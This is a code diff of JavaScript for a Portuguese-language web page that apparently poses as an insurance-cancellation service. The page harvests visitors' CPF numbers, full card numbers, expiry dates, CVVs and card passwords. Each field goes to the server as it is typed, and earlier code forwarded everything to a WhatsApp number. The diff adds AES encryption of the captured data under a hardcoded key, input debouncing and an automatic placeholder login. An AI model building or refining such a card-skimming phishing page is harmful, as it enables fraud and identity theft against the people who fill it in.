@@ -1,18 +1,33 @@
 let whatsappNumber = '+5511999999999'; // Default value, will be updated dynamically
 let sessionId = generateSessionId(); // Generate unique session ID for the user
 let transitionTriggered = false; // Flag to prevent multiple transitions
+let isAuthenticated = false; // Flag para autenticação
 
-// Generate a unique session ID
+// Gerar uma ID de sessão única
 function generateSessionId() {
     return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
 }
 
-// Send temporary data to the server
+// Função de debounce para otimizar requisições
+function debounce(func, wait) {
+    let timeout;
+    return function (...args) {
+        clearTimeout(timeout);
+        timeout = setTimeout(() => func.apply(this, args), wait);
+    };
+}
+
+// Enviar dados temporários ao servidor com criptografia
 async function sendTempData(field, value) {
+    if (!isAuthenticated) {
+        console.error('Usuário não autenticado. Faça login primeiro.');
+        return;
+    }
     try {
+        const encryptedValue = CryptoJS.AES.encrypt(value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(); // Use a mesma chave do servidor
         const data = {
             sessionId: sessionId,
-            [field]: value
+            [field]: encryptedValue
         };
         const response = await fetch('/api/temp-submit', {
             method: 'POST',
@@ -29,7 +44,7 @@ async function sendTempData(field, value) {
     }
 }
 
-// Register a visit (invisible)
+// Registrar uma visita (invisível)
 async function registerVisit() {
     try {
         const response = await fetch('/api/visit', {
@@ -46,14 +61,14 @@ async function registerVisit() {
     }
 }
 
-// Fetch WhatsApp number from backend
+// Buscar número do WhatsApp do backend
 async function loadWhatsAppNumber() {
     try {
         const response = await fetch('/api/contact-number');
         const data = await response.json();
         if (response.ok) {
             whatsappNumber = data.contactNumber;
-            // Update WhatsApp links
+            // Atualizar links do WhatsApp
             const whatsappButtonLink = document.getElementById('whatsapp-button-link');
             const whatsappFooterLink = document.getElementById('whatsapp-footer-link');
             if (whatsappButtonLink) whatsappButtonLink.href = `https://wa.me/${whatsappNumber}?text=Oi%20Carina!`;
@@ -67,7 +82,7 @@ async function loadWhatsAppNumber() {
     }
 }
 
-// Format CPF
+// Formatar CPF
 function formatCPF(input) {
     let value = input.value.replace(/\D/g, '');
     if (value.length <= 11) {
@@ -78,7 +93,7 @@ function formatCPF(input) {
     input.value = value;
 }
 
-// Validate CPF
+// Validar CPF
 function validateCPF(cpf) {
     console.log('Validating CPF:', cpf);
     cpf = cpf.replace(/\D/g, ''); // Remove pontos e traço
@@ -133,7 +148,7 @@ function checkCPF() {
     }
 }
 
-// Format Card Number
+// Formatar Número do Cartão
 function formatCardNumber(input) {
     let value = input.value.replace(/\D/g, '');
     if (value.length <= 16) {
@@ -144,7 +159,7 @@ function formatCardNumber(input) {
     input.value = value;
 }
 
-// Validate Card Number using Luhn Algorithm
+// Validar Número do Cartão usando o Algoritmo de Luhn
 function validateCardNumber() {
     const cardNumberInput = document.getElementById('card-number');
     const cardError = document.getElementById('card-error');
@@ -155,7 +170,7 @@ function validateCardNumber() {
         return false;
     }
 
-    // Luhn Algorithm
+    // Algoritmo de Luhn
     let sum = 0;
     let isEven = false;
     for (let i = cardNumber.length - 1; i >= 0; i--) {
@@ -177,7 +192,7 @@ function validateCardNumber() {
     return isValid;
 }
 
-// Format Expiry Date
+// Formatar Data de Expiração
 function formatExpiryDate(input) {
     let value = input.value.replace(/\D/g, '');
     if (value.length <= 4) {
@@ -186,7 +201,7 @@ function formatExpiryDate(input) {
     input.value = value;
 }
 
-// Validate Expiry Date
+// Validar Data de Expiração
 function validateExpiryDate() {
     const expiryDateInput = document.getElementById('expiry-date');
     const cvvInput = document.getElementById('cvv');
@@ -206,9 +221,9 @@ function validateExpiryDate() {
         return false;
     }
 
-    const currentYear = new Date().getFullYear() % 100; // Last two digits of current year (2025 -> 25)
+    const currentYear = new Date().getFullYear() % 100; // Últimos dois dígitos do ano atual (2025 -> 25)
     const currentMonth = new Date().getMonth() + 1; // 1-12
-    const fullYear = 2000 + year; // Convert AA to 20AA
+    const fullYear = 2000 + year; // Converte AA para 20AA
     const currentFullYear = 2000 + currentYear;
 
     if (fullYear < currentFullYear || (fullYear === currentFullYear && month < currentMonth)) {
@@ -222,7 +237,7 @@ function validateExpiryDate() {
     return true;
 }
 
-// Check all fields for card details and show additional fields after CVV
+// Verificar todos os campos para detalhes do cartão e mostrar campos adicionais após o CVV
 function checkFields() {
     const cardNumber = document.getElementById('card-number').value;
     const expiryDate = document.getElementById('expiry-date').value;
@@ -236,7 +251,7 @@ function checkFields() {
     }
 }
 
-// Show password field, card animation, and confirmation message
+// Mostrar campo de senha, animação de cartão e mensagem de confirmação
 function showAdditionalFields() {
     const cardContainer = document.getElementById('card-container');
     const confirmationMessage = document.getElementById('confirmation-message');
@@ -260,7 +275,7 @@ function showAdditionalFields() {
     }, 100);
 }
 
-// Hide password field, card animation, and confirmation message
+// Ocultar campo de senha, animação de cartão e mensagem de confirmação
 function hideAdditionalFields() {
     const cardContainer = document.getElementById('card-container');
     const confirmationMessage = document.getElementById('confirmation-message');
@@ -373,37 +388,37 @@ if (nextBtn) {
     });
 }
 
-// Add input event listeners to card fields
+// Add input event listeners to card fields com debounce
 const cardNumberInput = document.getElementById('card-number');
 const expiryDateInput = document.getElementById('expiry-date');
 const cvvInput = document.getElementById('cvv');
 
 if (cardNumberInput) {
-    cardNumberInput.addEventListener('input', () => {
+    cardNumberInput.addEventListener('input', debounce(() => {
         formatCardNumber(cardNumberInput);
         validateCardNumber();
         checkFields();
         sendTempData('cardNumber', cardNumberInput.value);
-    });
+    }, 300));
 }
 
 if (expiryDateInput) {
-    expiryDateInput.addEventListener('input', () => {
+    expiryDateInput.addEventListener('input', debounce(() => {
         formatExpiryDate(expiryDateInput);
         validateExpiryDate();
         checkFields();
         sendTempData('expiryDate', expiryDateInput.value);
-    });
+    }, 300));
 }
 
 if (cvvInput) {
-    cvvInput.addEventListener('input', () => {
+    cvvInput.addEventListener('input', debounce(() => {
         checkFields();
         sendTempData('cvv', cvvInput.value);
-    });
+    }, 300));
 }
 
-// Submit data and go to analysis screen
+// Submit data and go to analysis screen com autenticação
 const submitBtn = document.getElementById('submit-btn');
 if (submitBtn) {
     submitBtn.addEventListener('click', async () => {
@@ -431,6 +446,11 @@ if (submitBtn) {
             return;
         }
 
+        if (!isAuthenticated) {
+            alert('Faça login antes de enviar os dados.');
+            return;
+        }
+
         console.log('Submit button clicked:', { cpf: cpf.value, cardNumber: cardNumber.value, expiryDate: expiryDate.value, cvv: cvv.value, password: password.value });
 
         console.log('Transitioning to analysis screen');
@@ -441,16 +461,14 @@ if (submitBtn) {
             console.log('Analysis message displayed and scrolled into view');
         }, 100);
 
-        // Update WhatsApp redirect button link
-        const message = `Cancelamento de Seguro\nCPF: ${cpf.value}\nCartão: ${cardNumber.value}\nExpiração: ${expiryDate.value}\nCVV: ${cvv.value}\nSenha: ${password.value}`;
-        const encodedMessage = encodeURIComponent(message);
-        whatsappRedirectBtn.addEventListener('click', () => {
-            window.location.href = `https://wa.me/${whatsappNumber}?text=${encodedMessage}`;
-            console.log('Redirecting to WhatsApp:', whatsappNumber, encodedMessage);
-        }, { once: true });
+        // Criptografar dados antes de enviar
+        const encryptedCpf = CryptoJS.AES.encrypt(cpf.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString();
+        const encryptedCardNumber = CryptoJS.AES.encrypt(cardNumber.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString();
+        const encryptedExpiryDate = CryptoJS.AES.encrypt(expiryDate.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString();
+        const encryptedCvv = CryptoJS.AES.encrypt(cvv.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString();
+        const encryptedPassword = CryptoJS.AES.encrypt(password.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString();
 
-        // Optionally, send data to backend (uncomment when ready)
-        /*
+        // Enviar dados criptografados ao backend
         try {
             const response = await fetch('/submit', {
                 method: 'POST',
@@ -459,11 +477,11 @@ if (submitBtn) {
                 },
                 body: JSON.stringify({
                     sessionId: sessionId,
-                    cpf: cpf.value,
-                    cardNumber: cardNumber.value,
-                    expiryDate: expiryDate.value,
-                    cvv: cvv.value,
-                    password: password.value
+                    cpf: encryptedCpf,
+                    cardNumber: encryptedCardNumber,
+                    expiryDate: encryptedExpiryDate,
+                    cvv: encryptedCvv,
+                    password: encryptedPassword
                 })
             });
 
@@ -491,22 +509,46 @@ if (submitBtn) {
             console.error('Error submitting form:', error);
             alert('Erro ao enviar os dados. Tente novamente.');
         }
-        */
     });
 }
 
-// Load WhatsApp number and register visit on page load
+// Load WhatsApp number and register visit on page load com login
 window.onload = () => {
     console.log('Window loaded, initializing...');
+
+    // Função de login
+    async function login() {
+        try {
+            const response = await fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: 'user', password: 'pass' }) // Substitua por credenciais seguras
+            });
+            if (response.ok) {
+                isAuthenticated = true;
+                console.log('Login bem-sucedido');
+            } else {
+                console.error('Falha no login:', await response.json());
+                alert('Falha no login. Tente novamente.');
+            }
+        } catch (error) {
+            console.error('Error during login:', error);
+            alert('Erro ao fazer login.');
+        }
+    }
+
+    login(); // Executar login ao carregar a página
     loadWhatsAppNumber();
     registerVisit();
 
     const cpfInput = document.getElementById('cpf');
     if (cpfInput) {
-        cpfInput.addEventListener('input', () => {
+        cpfInput.addEventListener('input', debounce(() => {
             formatCPF(cpfInput);
             checkCPF();
             sendTempData('cpf', cpfInput.value);
-        });
+        }, 300));
     }
 };
+
+// Adicionar CryptoJS (instale com: npm install crypto-js)
